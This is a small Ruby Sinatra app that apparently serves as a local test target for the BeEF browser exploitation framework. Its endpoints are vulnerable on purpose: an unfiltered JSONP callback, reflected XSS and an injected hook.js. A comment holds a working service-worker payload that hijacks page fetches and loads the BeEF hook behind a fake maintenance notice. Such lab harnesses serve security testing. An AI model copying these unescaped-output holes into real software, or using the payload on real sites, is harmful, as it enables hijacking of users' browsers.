# make sure BeEF runs with default settings, meaning at 127.0.0.1:3000
# from a sane ruby environment:
# gem install sinatra-jsonp sinatra 
# ruby json-_ruby.rb
require "sinatra"
require "sinatra/jsonp"

# define your own callback as second string param
# a validated callback as the below one will remove parenthesis and other chars
# onfetchfunctioneife.request.url.indexOfhttp127.0.0.130000e.respondWithnewResponseh3Unplannedsitemaintenancepleasewaitafewsecondswearealmostdone.
# h3scriptsrchttp127.0.0.13000hook.jstypetextjavascriptscriptheadersContentTypetexthtmlelsee.fetche.request("onfetch function(e){\nif(!(e.request.
# 	url.indexOf('http://127.0.0.1:3000')>=0))\ne.respondWith(new Response('<h3>Unplanned site maintenance, please wait a few seconds, we are almost
# 	 done.</h3><script src=\\'http://127.0.0.1:3000/hook.js\\' type=\\'text/javascript\\'></script>',{headers: {'Content-Type':'text/html'}}))\nelse\ne.fetch(e.request)\n}//")
get '/jsonp' do  
  jsonp params[:callback], params[:callback]
end

# vulnerable JSONP with unfiltered callback
get '/vulnjsonp' do
    content_type 'application/javascript;charset=utf-8'
    params[:callback]
end


# having BeEF on the same machine -> http://localhost:4567/xss?secret=<script%20src="http://127.0.0.1:3000/hook.js"></script>
get '/xss' do
   "<html><head></head><body>You got XSSed:\n #{params[:secret]}</body></html>"
end

# supposedly BeEF is on the same machine
get '/xssstored' do
   "BeEFed <script src='http://127.0.0.1:3000/hook.js'></script>"
end

get '/sameorigin-1' do
   '<html><head></head>Secret on SameOrigin</body></html>'
end

get '/sameorigin-2' do
   '<html><head></head>Second Secret on SameOrigin</body></html>' 
end